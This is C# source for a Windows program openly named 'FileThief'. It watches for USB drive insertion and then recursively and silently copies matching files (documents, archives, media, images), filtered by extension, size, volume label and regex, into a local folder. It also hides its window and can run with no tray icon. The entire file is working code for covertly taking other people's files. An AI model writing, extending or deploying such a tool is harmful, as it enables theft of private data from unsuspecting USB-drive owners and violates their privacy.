using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace FileThief
{
    public partial class FrmMain : Form
    {
        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetVolumeInformation(
            string rootPathName,
            StringBuilder volumeNameBuffer,
            int volumeNameSize,
            out uint volumeSerialNumber,
            out uint maximumComponentLength,
            out FileSystemFeature fileSystemFlags,
            StringBuilder fileSystemNameBuffer,
            int nFileSystemNameSize);
        [Flags]
        public enum FileSystemFeature : uint
        {
            /// <summary>
            /// The file system preserves the case of file names when it places a name on disk.
            /// </summary>
            CasePreservedNames = 2,

            /// <summary>
            /// The file system supports case-sensitive file names.
            /// </summary>
            CaseSensitiveSearch = 1,

            /// <summary>
            /// The specified volume is a direct access (DAX) volume. This flag was introduced in Windows 10, version 1607.
            /// </summary>
            DaxVolume = 0x20000000,

            /// <summary>
            /// The file system supports file-based compression.
            /// </summary>
            FileCompression = 0x10,

            /// <summary>
            /// The file system supports named streams.
            /// </summary>
            NamedStreams = 0x40000,

            /// <summary>
            /// The file system preserves and enforces access control lists (ACL).
            /// </summary>
            PersistentACLS = 8,

            /// <summary>
            /// The specified volume is read-only.
            /// </summary>
            ReadOnlyVolume = 0x80000,

            /// <summary>
            /// The volume supports a single sequential write.
            /// </summary>
            SequentialWriteOnce = 0x100000,

            /// <summary>
            /// The file system supports the Encrypted File System (EFS).
            /// </summary>
            SupportsEncryption = 0x20000,

            /// <summary>
            /// The specified volume supports extended attributes. An extended attribute is a piece of
            /// application-specific metadata that an application can associate with a file and is not part
            /// of the file's data.
            /// </summary>
            SupportsExtendedAttributes = 0x00800000,

            /// <summary>
            /// The specified volume supports hard links. For more information, see Hard Links and Junctions.
            /// </summary>
            SupportsHardLinks = 0x00400000,

            /// <summary>
            /// The file system supports object identifiers.
            /// </summary>
            SupportsObjectIDs = 0x10000,

            /// <summary>
            /// The file system supports open by FileID. For more information, see FILE_ID_BOTH_DIR_INFO.
            /// </summary>
            SupportsOpenByFileId = 0x01000000,

            /// <summary>
            /// The file system supports re-parse points.
            /// </summary>
            SupportsReparsePoints = 0x80,

            /// <summary>
            /// The file system supports sparse files.
            /// </summary>
            SupportsSparseFiles = 0x40,

            /// <summary>
            /// The volume supports transactions.
            /// </summary>
            SupportsTransactions = 0x200000,

            /// <summary>
            /// The specified volume supports update sequence number (USN) journals. For more information,
            /// see Change Journal Records.
            /// </summary>
            SupportsUsnJournal = 0x02000000,

            /// <summary>
            /// The file system supports Unicode in file names as they appear on disk.
            /// </summary>
            UnicodeOnDisk = 4,

            /// <summary>
            /// The specified volume is a compressed volume, for example, a DoubleSpace volume.
            /// </summary>
            VolumeIsCompressed = 0x8000,

            /// <summary>
            /// The file system supports disk quotas.
            /// </summary>
            VolumeQuotas = 0x20
        }

        public const int WmDevicechange = 0x219;
        public const int DbtDevicearrival = 0x8000;
        public const int DbtConfigchangecanceled = 0x19;
        public const int DbtConfigchanged = 0x18;
        public const int DbtCustomevent = 0x8006;
        public const int DbtDevicequeryremove = 0x8001;
        public const int DbtDevicequeryremovefailed = 0x8002;
        public const int DbtDeviceremovecomplete = 0x8004;
        public const int DbtDeviceremovepending = 0x8003;
        public const int DbtDevicetypespecific = 0x8005;
        public const int DbtDevnodesChanged = 0x7;
        public const int DbtQuerychangeconfig = 0x17;
        public const int DbtUserdefined = 0xFFFF;

        public string UsbDrive, UsbLabel;

        public FrmMain()
        {
            InitializeComponent();
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WmDevicechange)
            {
                switch (m.WParam.ToInt32())
                {
                    case WmDevicechange:
                        break;
                    case DbtDevicearrival:
                        // USB Driver Connected 
                        var s = DriveInfo.GetDrives();
                        foreach (var drive in s)
                        {
                            //try
                            //{
                                if ( drive.DriveType == DriveType.Removable && ClsMain.Status)
                                {
                                    
                                    UsbDrive = drive.Name;
                                    // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                                    UsbLabel = drive.VolumeLabel != "" ? drive.VolumeLabel : drive.Name.Replace(":\\", "") +" (" + drive.GetHashCode() + ")";
                                    if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入，盘符 " + UsbDrive + ", 卷标 " + UsbLabel, 0, ClsMain.ConLogPath);
                                    var tScanFile =new Thread(StartThread);
                                    tScanFile.Start();
                                }
                            //}
                            //catch (Exception e)
                            //{
                            //    if (ClsMain.ConLog == "1" && ClsMain.ConLogErr == "1") WriteLog(e.Message, 1, ClsMain.ConLogPath);
                            //}
                            
                        }
                        break;
                    case DbtConfigchangecanceled:
                        break;
                    case DbtConfigchanged:
                        break;
                    case DbtCustomevent:
                        break;
                    case DbtDevicequeryremove:
                        break;
                    case DbtDevicequeryremovefailed:
                        break;
                    case DbtDeviceremovecomplete:
                        // USB Driver Disconnected
                        UsbDrive = ""; 
                        if (ClsMain.ConLogInfo == "1") WriteLog("设备已弹出", 0, ClsMain.ConLogPath);
                        break;
                    case DbtDeviceremovepending:
                        break;
                    case DbtDevicetypespecific:
                        break;
                    case DbtDevnodesChanged:
                        break;
                    case DbtQuerychangeconfig:
                        break;
                    case DbtUserdefined:
                        break;
                }
            }
            base.WndProc(ref m);
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            if (!File.Exists(ClsMain.StrConfig))
            {
                ClsMain.WriteIni("FileType", "Type", "rar|zip|7z|doc|docx|ppt|pptx|xls|xlsx|mp3|mp4|3gp|mov|avi|dat|jpg|png|bmp", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "TypeMode", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "Size", "10240", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "SizeMode", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "Path", "", ClsMain.StrConfig);

                ClsMain.WriteIni("FileName", "RegExp", "", ClsMain.StrConfig);

                ClsMain.WriteIni("Driver", "VolumeLabel", "", ClsMain.StrConfig);
                ClsMain.WriteIni("Driver", "VolumeLabelMode", "0", ClsMain.StrConfig);

                ClsMain.WriteIni("Log", "WriteLog", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogPath", Application.StartupPath + "\\FileThief.log", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogError", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogInfo", "1", ClsMain.StrConfig);

                ClsMain.WriteIni("General", "Startup", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("General", "SilentMode", "0", ClsMain.StrConfig);
                LoadSettings();
                if (!Directory.Exists(Application.StartupPath + "\\Files")) Directory.CreateDirectory(Application.StartupPath + "\\Files");
                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\n\r\n\r", Encoding.UTF8);
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1"){ WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);}
            }
            else
            {
                LoadSettings();
                if (!Directory.Exists(ClsMain.ConPath) && ClsMain.ConPath != "") Directory.CreateDirectory(ClsMain.ConPath);
                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\n\r\n\r", Encoding.UTF8);
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1") WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);
            }
            if (ClsMain.ConSilent == "0")
            {
                ntf.Visible = true;
            }
            // Hide Form
            BeginInvoke(new Action(() => {
                Hide();
                Opacity = 1;
            }));
            
        }

        public void LoadSettings()
        {
            ClsMain.ConType = ClsMain.ReadIni("FileType", "Type", "rar|zip|7z|doc|docx|ppt|pptx|xls|xlsx|mp3|mp4|3gp|mov|avi|dat|jpg|png|bmp", ClsMain.StrConfig).Split('|');
            ClsMain.BType = ClsMain.ReadIni("FileType", "TypeMode", "0", ClsMain.StrConfig);
            ClsMain.CType = ClsMain.ReadIni("FileType", "Type", "rar|zip|7z|doc|docx|ppt|pptx|xls|xlsx|mp3|mp4|3gp|mov|avi|dat|jpg|png|bmp", ClsMain.StrConfig);
            ClsMain.ConSize = Convert.ToInt32(ClsMain.ReadIni("FileType", "Size", "10240", ClsMain.StrConfig));
            ClsMain.BSize = ClsMain.ReadIni("FileType", "SizeMode", "0", ClsMain.StrConfig);
            ClsMain.ConPath = ClsMain.ReadIni("FileType", "Path", Application.StartupPath + "\\Files", ClsMain.StrConfig);

            ClsMain.ConFileNameRegExp = ClsMain.ReadIni("FileName", "RegExp", "", ClsMain.StrConfig);

            ClsMain.ConLabel = ClsMain.ReadIni("Driver", "VolumeLabel", "", ClsMain.StrConfig).Split(new char[] { '|' });
            ClsMain.BLabel = ClsMain.ReadIni("Driver", "VolumeLabelMode", "0", ClsMain.StrConfig);
            ClsMain.CLabel = ClsMain.ReadIni("Driver", "VolumeLabel", "", ClsMain.StrConfig);

            ClsMain.ConLog = ClsMain.ReadIni("Log", "WriteLog", "1", ClsMain.StrConfig);
            ClsMain.ConLogPath = ClsMain.ReadIni("Log", "LogPath", "", ClsMain.StrConfig);
            ClsMain.ConLogErr = ClsMain.ReadIni("Log", "LogError", "1", ClsMain.StrConfig);
            ClsMain.ConLogInfo = ClsMain.ReadIni("Log", "LogInfo", "1", ClsMain.StrConfig);

            ClsMain.ConStartup = ClsMain.ReadIni("General", "Startup", "0", ClsMain.StrConfig);
            ClsMain.ConSilent = ClsMain.ReadIni("General", "SilentMode", "1", ClsMain.StrConfig);
        }

        public void ScanFile(string driver, string[] volumeLabel, string[] extension, string regExp)
        {
            if (driver != "")
            {
                var mDirInfo = new DirectoryInfo(driver);
                try
                {
                    //Specified Volume Label
                    if (volumeLabel.Length >= 1 && volumeLabel[0] != "")
                    {
                        foreach (var vLabel in volumeLabel)
                        {
                            if ((vLabel == UsbLabel && ClsMain.BLabel=="0") | (vLabel != UsbLabel && ClsMain.BLabel=="1")) // Check Volume Label
                            {
                                foreach (string exName in extension) // Check Extension Name
                                {
                                    foreach (var mFileInfo in mDirInfo.GetFiles("*." + exName))
                                    {
                                        double dFileLength = mFileInfo.Length / (double)1024;
                                        if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <= ClsMain.ConSize) // Check File Size
                                        {
                                            var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
                                                UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
                                            // Check File Name using RegExp
                                            if (ClsMain.ConFileNameRegExp != "")
                                            {
                                                Regex regex =
                                                    new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
                                                if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
                                                {
                                                    MatchCollection matchCollection =
                                                        regex.Matches(Path.GetFileName(mFileInfo.FullName));
                                                    foreach (Match match in matchCollection)
                                                    {
                                                        // Create Directory if Not Exists
                                                        if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                            Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                                        if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                        // Copy File
                                                        File.Copy(mFileInfo.FullName,
                                                            mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                                ClsMain.ConPath + "\\" + UsbLabel),
                                                            true);
                                                        if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                            WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                                ClsMain.ConLogPath); Debug.WriteLine("1 "+ mFileInfo.FullName);
                                                    }
                                                }
                                            }
                                            else
                                            {
                                                // Create Directory if Not Exists
                                                if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                    Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                                if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                // Copy File
                                                File.Copy(mFileInfo.FullName,
                                                    mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                        ClsMain.ConPath + "\\" + UsbLabel),
                                                            true);
                                                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                    WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                        ClsMain.ConLogPath); Debug.WriteLine("2 "+ mFileInfo.FullName);
                                            }
                                            
                                            
                                        }
                                    }
                                }
                                foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
                                {
                                    ScanFile(mDir.FullName, volumeLabel, extension,ClsMain.ConFileNameRegExp );
                                }
                            }
                        }
                    }
                    else
                    {
                        // Not specified Volume Label
                        foreach (string exName in extension) // Check Extension Name
                        {
                            foreach (FileInfo mFileInfo in mDirInfo.GetFiles("*." + exName))
                            {
                                double dFileLength = mFileInfo.Length / (double)1024;
                                if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <= ClsMain.ConSize) // Check File Size
                                {
                                    var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
                                        UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
                                    // Copy File
                                    // Check File Name using RegExp
                                    if (ClsMain.ConFileNameRegExp != "")
                                    {
                                        Regex regex =
                                            new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
                                        if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
                                        {
                                            MatchCollection matchCollection =
                                                regex.Matches(Path.GetFileName(mFileInfo.FullName));
                                            foreach (Match match in matchCollection)
                                            {
                                                // Create Directory if Not Exists
                                                if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                    Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                                if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                // Copy File
                                                File.Copy(mFileInfo.FullName,
                                                    mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                        ClsMain.ConPath + "\\" + UsbLabel),
                                                    true);
                                                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                    WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                        ClsMain.ConLogPath); Debug.WriteLine("3 "+ mFileInfo.FullName);
                                            }
                                        }
                                    }
                                    else
                                    {
                                        // Create Directory if Not Exists
                                        if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                            Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                        if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                        // Copy File
                                        {
                                            File.Copy(mFileInfo.FullName,
                                            mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                ClsMain.ConPath + "\\" + UsbLabel),
                                            true);
                                            if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                    ClsMain.ConLogPath); Debug.WriteLine("4 "+ mFileInfo.FullName);
                                        }
                                    }
                                }
                            }
                        }
                        foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
                        {
                            ScanFile(mDir.FullName, volumeLabel, extension,ClsMain.ConFileNameRegExp );
                        }
                    }
                }
                catch (Exception ex)
                {
                    if (ClsMain.ConLog == "1" && ClsMain.ConLogErr == "1") WriteLog(ex.Message, 1, ClsMain.ConLogPath);
                }
            }
        }

        private void tsmiSettings_Click(object sender, EventArgs e)
        {
            new FrmSettings().Show();
        }

        private void tsmiStartStop_Click(object sender, EventArgs e)
        {
            ClsMain.Status = !ClsMain.Status;
            if (ClsMain.Status)
            {
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1") WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);
                tsmiStartStop.Text = "停止(&S)";
            }
            else
            {
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1") WriteLog("FileThief 停止运行", 0, ClsMain.ConLogPath);
                tsmiStartStop.Text = "启动(&S)";
            }
        }

        private void tsmiAbout_Click(object sender, EventArgs e)
        {
            new FrmAbout().Show();
        }

        public void WriteLog(string content, int logType, string path)
        {
            var dt = DateTime.Now;
            using (var file = new StreamWriter(path, true))
            {
                switch (logType)
                {
                    case 0: // Info
                        file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][信息] " + content);
                        break;
                    case 1: // Error
                        file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][错误] " + content);
                        break;
                } 
            }
        }

        public void StartThread()
        {
            ScanFile(UsbDrive, ClsMain.ConLabel, ClsMain.ConType, ClsMain.ConFileNameRegExp);
        }

        public static string GetDiskVolumeSerialNumber(string driverName)
        {
            var disk = new ManagementObject("Win32_LogicalDisk.DeviceId=\""+ driverName.Replace("\\","") + "\"");
            var vsn = "";
            foreach (var diskProperty in disk.Properties)
            {
                if (diskProperty.Name == "VolumeSerialNumber")
                {
                    vsn = diskProperty.Value.ToString();
                }
            }
            return vsn;
        }
        
    }
}